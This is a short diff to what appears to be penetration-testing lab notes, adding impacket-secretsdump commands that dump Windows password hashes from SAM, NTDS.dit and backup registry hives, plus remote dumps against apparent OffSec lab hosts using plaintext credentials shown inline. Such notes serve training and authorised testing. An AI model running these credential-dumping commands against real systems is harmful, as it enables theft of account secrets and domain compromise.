@@ -12,4 +12,15 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 secretsdump.py hutch.offsec/administrator:'9%GR6qN[.#)x4i'@TARGET
 ```
 
+```
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+```
+impacket-secretsdump vault.offsec/anirudh:SecureHM@TARGET
+```
+
+```
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+```
 
